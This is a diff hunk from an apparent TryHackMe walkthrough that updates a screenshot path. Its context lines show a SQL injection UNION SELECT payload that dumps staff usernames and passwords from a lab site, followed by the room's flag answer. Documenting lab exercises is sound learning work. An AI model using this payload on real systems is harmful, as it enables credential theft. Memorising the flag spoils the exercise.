@@ -70,7 +70,7 @@ This is my TryHackMe walkthrough, created to document my learning journey and sh
 https://website.thm/article?id=0 UNION SELECT 1,2, GROUP_CONCAT(CONCAT(username,':',password) SEPARATOR '<br>') FROM staff_users--
 ```
 
-![Guide image](./screenshots/sql-injection-1.png)
+![Guide image](/images/posts/sql-injection-1.png)
 
 **=> Answer: `THM{SQL_INJECTION_3840}`**
 
